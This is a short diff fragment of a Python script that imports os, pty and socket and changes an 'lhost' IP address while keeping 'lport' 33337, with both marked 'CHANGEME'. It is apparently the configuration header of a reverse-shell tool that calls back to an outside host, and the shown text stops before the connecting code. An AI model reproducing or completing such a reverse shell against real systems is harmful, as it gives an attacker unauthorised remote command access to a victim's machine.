@@ -14,7 +14,7 @@ import os
 import pty
 import socket
 
-lhost = "199.188.203.217" # XXX: CHANGEME
+lhost = "82.196.0.87" # XXX: CHANGEME
 lport = 33337 # XXX: CHANGEME
 
 def main():
